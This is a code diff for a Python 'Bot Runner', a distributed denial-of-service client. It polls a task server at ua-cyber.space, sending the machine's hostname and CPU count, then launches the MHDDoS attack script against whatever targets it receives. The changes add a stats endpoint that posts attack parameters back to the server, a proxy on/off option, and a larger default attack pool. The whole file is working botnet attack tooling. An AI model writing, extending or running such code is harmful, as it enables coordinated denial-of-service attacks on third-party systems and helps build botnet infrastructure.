@@ -12,8 +12,7 @@ from queue import Queue
 from socket import gethostname
 from threading import Thread
 from time import sleep
-from urllib.request import urlopen
-
+from urllib.request import urlopen, Request
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -22,7 +21,10 @@ getLogger('proxies').setLevel("CRITICAL")
 logger = getLogger("Bot Runner")
 logger.setLevel("INFO")
 
-url = f"https://ua-cyber.space/api/v2/tasks/json/?hostname={gethostname()}&cpu_count={psutil.cpu_count()}"
+host = "https://ua-cyber.space"
+
+url = f"{host}/api/v2/tasks/json/?hostname={gethostname()}&cpu_count={psutil.cpu_count()}"
+counters = f"{host}/api/v3/tasks/stats/"
 
 loop_time = 60
 RETRY_PERIOD_SEC = 30
@@ -120,7 +122,14 @@ def runner(config, cpu_limit, threads_limit=0):
             sleep(loop_time)
             cpu_usage = psutil.cpu_percent(4)
         subprocess.run([sys.executable, "MHDDoS/start.py", *params])
-        logger.info("The system works good! Thanks :P ")
+        try:
+            req = Request(counters)
+            req.add_header('Content-Type', 'application/json')
+            response = urlopen(req, str(json.dumps(params)).encode('utf-8'))
+            st = json.dumps(response.read().decode())
+            logger.info(f"The system works good! Thanks :D")
+        except Exception as error:
+            pass
     except KeyboardInterrupt:
         logger.info("Shutting down... Ctrl + C")
     except Exception as error:
@@ -142,7 +151,7 @@ if __name__ == '__main__':
                         action="store",
                         required=False,
                         type=int,
-                        default=psutil.cpu_count() // 2,
+                        default=psutil.cpu_count() // 2 + 1,
                         help="Maximum amount of the attacks executed in parallel (attack pool size).")
     parser.add_argument("-t", "--attack-threads-limit",
                         action="store",
@@ -158,19 +167,31 @@ if __name__ == '__main__':
                         type=int,
                         default=70,
                         help="Limit the CPU usage by attacks to the specified value.")
+    parser.add_argument("--use-proxy",
+                        action=argparse.BooleanOptionalAction,
+                        required=False,
+                        type=bool,
+                        default=True,
+                        help="Use proxies")
+
 
     args = parser.parse_args()
     pool_size = args.max_attacks
     max_threads = args.attack_threads_limit
     cpu_limit = args.cpu_limit
+    use_proxy = args.use_proxy
 
     logger.info(f"Fetch tasks URL: {url}")
 
     try:
         pool = ThreadPool(pool_size)
 
-        logger.info("Get fresh proxies. Please wait...")
-        update_file()
+        if use_proxy:
+            logger.info("Get fresh proxies. Please wait...")
+            update_file()
+        else:
+            with open('MHDDoS/files/proxies/proxylist.txt', 'w') as emty:
+                emty.writelines('')
 
         while True:
             logger.info("Getting fresh tasks from the server!")
@@ -190,4 +211,3 @@ if __name__ == '__main__':
     except Exception as error:
         logger.critical(f"OOPS... We faced an issue: {error}")
         logger.info("Please restart the tool! Thanks")
-
